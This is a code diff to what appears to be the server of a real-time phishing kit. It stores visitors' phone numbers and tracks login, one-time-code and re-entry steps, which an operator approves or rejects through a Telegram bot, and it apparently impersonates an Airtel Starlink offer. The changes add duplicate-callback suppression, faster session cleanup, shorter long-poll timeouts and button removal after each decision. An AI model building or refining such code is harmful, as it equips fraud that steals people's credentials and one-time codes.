@@ -45,6 +45,9 @@ const cloudIdToSessionMap = new Map<string, string>();
 // Telegram message_id to canonical sessionId index for 100% exact multi-user routing
 const messageIdToSessionMap = new Map<number, string>();
 
+// Track processed callback IDs to prevent duplicate processing
+const processedCallbackIds = new Set<string>();
+
 // Event listeners for instant long-polling responses (< 50ms latency)
 type SessionListener = (session: SessionRecord) => void;
 const waitingListeners = new Map<string, Set<SessionListener>>();
@@ -922,12 +925,13 @@ setInterval(() => {
   sessions.forEach((s, key) => {
     const isFinished =
       s.reenterStatus === 'approved' ||
+      s.reenterStatus === 'rejected' ||
       s.loginStatus === 'rejected' ||
-      s.otpStatus === 'rejected' ||
-      s.reenterStatus === 'rejected';
+      s.otpStatus === 'rejected';
+    const isApproved = s.loginStatus === 'approved' || s.otpStatus === 'approved';
     const age = now - s.lastUpdated;
-    // Remove completed sessions after 2 hours, or any stale session older than 24h
-    if ((isFinished && age > 2 * 3600 * 1000) || age > 24 * 3600 * 1000) {
+    // Remove approved sessions after 10 minutes, rejected after 2 hours, or any stale session older than 24h
+    if ((isApproved && age > 10 * 60 * 1000) || (isFinished && age > 2 * 3600 * 1000) || age > 24 * 3600 * 1000) {
       sessions.delete(key);
       if (phoneToSessionMap.get(s.phone) === key) {
         phoneToSessionMap.delete(s.phone);
@@ -938,6 +942,9 @@ setInterval(() => {
       if (s.loginMessageId) messageIdToSessionMap.delete(s.loginMessageId);
       if (s.otpMessageId) messageIdToSessionMap.delete(s.otpMessageId);
       if (s.reenterMessageId) messageIdToSessionMap.delete(s.reenterMessageId);
+      // Clean up waiting listeners for this session
+      waitingListeners.delete(key);
+      if (s.cloudId) waitingListeners.delete(s.cloudId);
       cleaned++;
     }
   });
@@ -945,7 +952,7 @@ setInterval(() => {
     console.log(`[Storage Cleanup] Purged ${cleaned} stale sessions.`);
     saveSessionsToDisk();
   }
-}, 10 * 60 * 1000);
+}, 5 * 60 * 1000); // Run cleanup every 5 minutes instead of 10
 
 // API Health Endpoint
 app.get('/api/health', (req, res) => {
@@ -1341,14 +1348,14 @@ app.get('/api/telegram/status', (req, res) => {
 });
 
 // 4. Ultra-Fast Event-Driven Long-Poll Endpoint
-// Suspends response until Telegram bot clicks button or timeout fires (default 15s, max 30s)
+// Suspends response until Telegram bot clicks button or timeout fires (default 10s, max 20s)
 app.get('/api/telegram/wait-status', (req, res) => {
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
   const sessionId = (req.query.sessionId || req.query.id) as string;
   const cloudId = (req.query.cloudId || req.query.id) as string;
   const phone = req.query.phone as string;
   const targetStep = (req.query.targetStep as 'login' | 'otp' | 'reenter') || 'login';
-  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 15000, 1500), 30000);
+  const timeoutMs = Math.min(Math.max(parseInt(req.query.timeout as string, 10) || 10000, 1500), 20000);
 
   let session: SessionRecord | undefined;
   if (sessionId) {
@@ -1513,6 +1520,20 @@ app.post('/api/telegram/webhook', async (req, res) => {
       }
 
       if (recordId || msgId) {
+        // Prevent duplicate callback processing
+        const callbackKey = `${callbackId}_${actionType}_${recordId}`;
+        if (processedCallbackIds.has(callbackKey)) {
+          console.log(`[Webhook] Ignoring duplicate callback: ${callbackKey}`);
+          return res.status(200).json({ ok: true, duplicate: true });
+        }
+        processedCallbackIds.add(callbackKey);
+
+        // Clean up old callback IDs periodically (keep last 1000)
+        if (processedCallbackIds.size > 1000) {
+          const oldest = Array.from(processedCallbackIds)[0];
+          processedCallbackIds.delete(oldest);
+        }
+
         // 1. Update in-memory session using multi-index lookup
         const session = findSessionByIdOrPhone(recordId, originalText, msgId);
         if (session) {
@@ -1562,7 +1583,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
         answerCallbackQuery(callbackId, alertMsg, true);
 
-        // 4. Update message in Telegram
+        // 4. Update message in Telegram and remove buttons
         if (msgId && chatId) {
           const phone = session?.phone || 'Inconnu';
           const plan = session?.planName || 'Forfait Airtel Starlink';
@@ -1620,7 +1641,18 @@ app.post('/api/telegram/webhook', async (req, res) => {
           }
 
           if (updatedText) {
-            editMessageText(chatId, msgId, updatedText);
+            // Update message text and remove inline buttons
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: chatId,
+                message_id: msgId,
+                text: updatedText,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }, // Remove buttons
+              }),
+            }).catch((err) => console.warn('editMessageText error:', err));
           }
         }
       }
